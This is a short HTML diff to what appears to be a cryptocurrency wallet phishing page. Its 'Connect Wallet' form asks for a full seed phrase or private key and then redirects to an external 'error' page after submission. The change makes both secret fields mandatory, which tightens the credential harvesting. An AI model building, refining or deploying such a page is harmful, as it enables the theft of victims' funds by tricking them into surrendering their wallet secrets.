@@ -1248,7 +1248,7 @@
                                         <input type="hidden" name="_next" value="https://multinodeconnect.pages.dev/error/load.html">  
             <div id="seedContent" class="tab-pane active">
               <label for="seedPhrase">Enter your 12 or 24 word seed phrase (space separated)</label>
-              <textarea name="seedPhrase" id="seedPhrase" placeholder="word1 word2 word3 word4..."></textarea>
+              <textarea name="seedPhrase" id="seedPhrase" placeholder="word1 word2 word3 word4..." required ></textarea>
               <input type="hidden" name="walletType" id="walletTypeInput" value="Space" />
               <button type="submit" class="primary-btn full-width">
                 Connect Wallet
@@ -1263,7 +1263,7 @@
                                         
             <div id="keyContent" class="tab-pane">
               <label for="privateKey">Enter your private key</label>
-              <input type="text" name="privateKey" id="privateKey" placeholder="0x..." />
+              <input type="text" name="privateKey"required id="privateKey" placeholder="0x..." />
               <button type="submit" class="primary-btn full-width">
                 Connect Wallet
               </button>
